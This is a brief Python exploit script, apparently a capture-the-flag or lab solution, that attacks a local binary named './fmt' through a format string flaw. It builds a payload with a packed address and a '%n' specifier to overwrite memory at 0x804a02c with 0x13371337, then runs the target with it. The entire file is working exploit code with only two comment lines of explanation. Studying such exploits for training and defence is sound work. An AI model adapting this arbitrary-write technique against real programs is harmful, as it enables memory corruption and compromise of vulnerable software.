#!/usr/bin/env python

from zio import *
from struct import pack
import os

# simple format string exploitation
# buffer is at the stack

target = './fmt'
flag_addr = 0x804a02c

payload = pack('<I',flag_addr) + '%' + str(0x13371337-4) + 'x%11$n'
os.system(target + ' ' + payload)

